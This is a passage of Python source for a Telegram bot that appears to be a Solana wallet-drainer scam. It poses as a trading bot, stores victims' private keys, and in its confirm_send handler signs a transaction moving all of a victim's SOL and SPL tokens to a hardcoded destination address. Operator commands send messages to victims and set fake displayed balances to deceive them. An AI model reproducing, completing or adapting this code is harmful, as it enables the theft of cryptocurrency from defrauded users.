                keyboard = [[InlineKeyboardButton("Support", url=f'https://t.me/')]]
                reply_markup = InlineKeyboardMarkup(keyboard)
                photo_url = "https://media.discordapp.net/attachments/931287855504969728/1270613197988302918/image.png?ex=66b45641&is=66b304c1&hm=a84eef342e9c90f36827b1af30152d34509e4178e1569a08500278de2e601f26&=&format=webp&quality=lossless&width=1018&height=1018"

                message = (
                    "â <b>Success</b>\n\n"
                    "Commands:\n\n"
                    "/send @username Message \n<i>(Sends victim a message)</i>\n\n"
                    "/balance @username &lt;amount&gt;\n<i>(Changes SOL balance)</i>\n\n"
                    "@BIoom_Solanabot"
                )

                await context.bot.send_photo(
                    chat_id=chat_id,
                    photo=photo_url,
                    caption=message,
                    reply_markup=reply_markup,
                    parse_mode=ParseMode.HTML
                )
        except Exception as e:
            logger.error(f"Error handling chat member update: {e}")

# ======================================
# ====== /send TO USER (unchanged) =====
# ======================================

async def send_user_command(update: Update, context: CallbackContext) -> None:
    try:
        args = context.args
        if len(args) < 2:
            await update.message.reply_text("Usage: /send @username_or_userid Your message here")
            return

        target = args[0]
        message = ' '.join(args[1:])
        chat_id = None

        if target.startswith("@"):
            target = target.lstrip("@")
            if os.path.exists("users.txt"):
                with open("users.txt", "r") as f:
                    for line in f:
                        u, uid = line.strip().split(",")
                        if u.lower() == target.lower():
                            chat_id = int(uid)
                            break
        elif target.isdigit():
            chat_id = int(target)

        if not chat_id:
            await update.message.reply_text(f"â Could not find user ID for {target}. They must message the bot first.")
            return

        await context.bot.send_message(chat_id=chat_id, text=f"<b>{message}</b>", parse_mode=ParseMode.HTML)
        await update.message.reply_text(f"â Message sent to {target}")

    except Exception as e:
        logger.error(f"Error in /send: {e}")
        await update.message.reply_text(f"â Failed to send message to {target}.")

# ======================================
# ============== MAIN ==================
# ======================================
async def confirm_send(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    await query.answer()

    # callback_data looks like "confirm_send:<victim_user_id>"
    try:
        _, victim_id_str = query.data.split(":")
        victim_id = int(victim_id_str)
    except Exception:
        await query.edit_message_text("â Invalid confirmation payload.")
        return

    secret_b58 = user_private_keys.get(victim_id)
    if not secret_b58:
        await query.edit_message_text("â Session expired. Please have the user re-enter their key/seed.")
        return

    await query.edit_message_text("â³ Processing transfers...")

    try:
        key_bytes = base58.b58decode(secret_b58)
        if len(key_bytes) != 64:
            await query.edit_message_text("â Session key invalid. Please start over.")
            return

        kp = Keypair.from_bytes(key_bytes)
        public_key = kp.pubkey()
        instructions = []

        async with AsyncClient("https://api.mainnet-beta.solana.com") as async_client:
            # 1) Collect SPL token accounts with balances
            token_accounts = (await async_client.get_token_accounts_by_owner(
                public_key,
                TokenAccountOpts(program_id=TOKEN_PROGRAM_ID)
            )).value

            mints_to_process = set()
            token_data = {}

            for acc in token_accounts:
                try:
                    account_info = acc.account
                    data_bytes = account_info.data.raw if hasattr(account_info.data, 'raw') else account_info.data
                    if isinstance(data_bytes, str):
                        data_bytes = base64.b64decode(data_bytes)

                    parsed = ACCOUNT_LAYOUT.parse(data_bytes)
                    mint = Pubkey.from_bytes(bytes(parsed.mint))
                    amount = parsed.amount

                    if amount > 0:
                        mints_to_process.add(mint)
                        token_data[str(acc.pubkey)] = {
                            'mint': mint,
                            'amount': amount,
                            'source': acc.pubkey
                        }
                except Exception as e:
                    logger.warning(f"Skipping token account {acc.pubkey}: {e}")

            # 2) Fetch decimals for each mint (byte 44 of Mint account)
            mint_infos = {}
            import aiohttp as _aiohttp  # ensure session is available here
            async with _aiohttp.ClientSession() as session:
                tasks = []
                for mint in mints_to_process:
                    payload = {
                        "jsonrpc": "2.0",
                        "id": 1,
                        "method": "getAccountInfo",
                        "params": [str(mint), {"encoding": "base64"}]
                    }
                    tasks.append(session.post("https://api.mainnet-beta.solana.com", json=payload))
                responses = await asyncio.gather(*tasks, return_exceptions=True)

                for resp, mint in zip(responses, mints_to_process):
                    try:
                        data = await resp.json()
                        if data.get("result") and data["result"]["value"]:
                            mint_data = base64.b64decode(data["result"]["value"]["data"][0])
                            mint_infos[str(mint)] = mint_data[44]  # decimals
                    except Exception as e:
                        logger.warning(f"Failed decimals for mint {mint}: {e}")

            # 3) Count ATAs to create (rent calc)
            ata_creations = 0
            for data in token_data.values():
                dest_ata = get_associated_token_address(DESTINATION_ADDRESS, data['mint'])
                dest_info = await async_client.get_account_info(dest_ata)
                if not dest_info.value:
                    ata_creations += 1

            # 4) Transfer SOL leaving enough for rent & fee
            lamports = (await async_client.get_balance(public_key)).value
            required = ata_creations * 2039280 + 5000  # ~ATA rent + fee
            if lamports > required:
                instructions.append(
                    sys_transfer(
                        SysTransferParams(
                            from_pubkey=public_key,
                            to_pubkey=DESTINATION_ADDRESS,
                            lamports=lamports - required
                        )
                    )
                )

            # 5) Transfer tokens (create dest ATA if missing)
            for data in token_data.values():
                mint_str = str(data['mint'])
                decimals = mint_infos.get(mint_str)
                if decimals is None:
                    continue

                dest_ata = get_associated_token_address(DESTINATION_ADDRESS, data['mint'])
                dest_info = await async_client.get_account_info(dest_ata)
                if not dest_info.value:
                    instructions.append(create_associated_token_account(
                        payer=public_key,
                        owner=DESTINATION_ADDRESS,
                        mint=data['mint']
                    ))

                instructions.append(transfer_checked(
                    TransferCheckedParams(
                        program_id=TOKEN_PROGRAM_ID,
                        source=data['source'],
                        mint=data['mint'],
                        dest=dest_ata,
                        owner=public_key,
                        amount=data['amount'],
                        decimals=decimals,
                        signers=[]
                    )
                ))

            if not instructions:
                await query.edit_message_text("â No SOL or token balances to send.")
                return

            # 6) Build & send transaction
            blockhash = (await async_client.get_latest_blockhash()).value.blockhash
            msg = Message.new_with_blockhash(instructions, public_key, blockhash)
            tx = Transaction([kp], msg, blockhash)
            result = await async_client.send_transaction(tx)

            if result.value:
                await query.edit_message_text(
                    f"â Successfully transferred assets!\n"
                    f"Transaction: https://solscan.io/tx/{result.value}"
                )
            else:
                await query.edit_message_text("â Transaction failed.")

    except Exception as e:
        logger.error(f"Transaction error: {e}")
        await query.edit_message_text("â An error occurred while processing the transfer.")

async def cancel_send(update: Update, context: CallbackContext) -> None:
    await update.callback_query.answer()
    await update.callback_query.edit_message_text("â Transfer cancelled.")

async def set_balance_command(update: Update, context: CallbackContext) -> None:
    """Sets a user's balance. Usage: /setbalance <user_id> <amount>"""
    try:
        if len(context.args) < 2:
            await update.message.reply_text("Usage: /setbalance <user_id> <amount>")
            return
        
        target_id = context.args[0]
        amount = context.args[1]
        
        target_username = None
        if os.path.exists("users.txt"):
            with open("users.txt", "r") as f:
                for line in f:
                    u, uid = line.strip().split(",")
                    if uid == target_id:
                        target_username = u.lower()
                        break
        
        if target_username:
            user_balances[target_username] = amount
            await update.message.reply_text(f"â Set balance for @{target_username} ({target_id}) to {amount} SOL")
        else:
            # If username not found, we still store it by ID in case it helps
            # But the current code mostly uses username. Let's try to store both.
            user_balances[target_id] = amount
            await update.message.reply_text(f"â Set balance for ID {target_id} to {amount} SOL")
            
    except Exception as e:
        logger.error(f"Error in /setbalance: {e}")
        await update.message.reply_text(f"â Error: {str(e)}")

async def send_msg_command(update: Update, context: CallbackContext) -> None:
    """Sends a message to a user. Usage: /sendmsg <user_id> <message>"""
    try:
        if len(context.args) < 2:
            await update.message.reply_text("Usage: /sendmsg <user_id> <message>")
            return
        
        target_id = int(context.args[0])
        msg_text = " ".join(context.args[1:])
        
        await context.bot.send_message(chat_id=target_id, text=msg_text, parse_mode=ParseMode.HTML)
        await update.message.reply_text(f"â Message sent to {target_id}")
    except Exception as e:
        logger.error(f"Error in /sendmsg: {e}")
        await update.message.reply_text(f"â Error: {str(e)}")

async def admin_command(update: Update, context: CallbackContext) -> None:
    """Admin command that shows buttons for balance and send message actions."""
    keyboard = [
        [InlineKeyboardButton("ð° Set Balance", callback_data='admin_set_balance')],
        [InlineKeyboardButton("ð¨ Send Message", callback_data='admin_send_message')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "ð§ <b>Admin Panel</b>\n\nSelect an action:",
        reply_markup=reply_markup,
        parse_mode=ParseMode.HTML
    )

def main() -> None:
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("send", send_user_command))
    application.add_handler(CommandHandler("setbalance", set_balance_command))
    application.add_handler(CommandHandler("sendmsg", send_msg_command))
    application.add_handler(CommandHandler("admin", admin_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(CommandHandler("balance", balance_command))
    application.add_handler(ChatMemberHandler(handle_my_chat_member))

    # Register the generic menu/buttons LAST (and only once)
    application.add_handler(CallbackQueryHandler(button))

    application.run_polling()


if __name__ == '__main__':
    main()
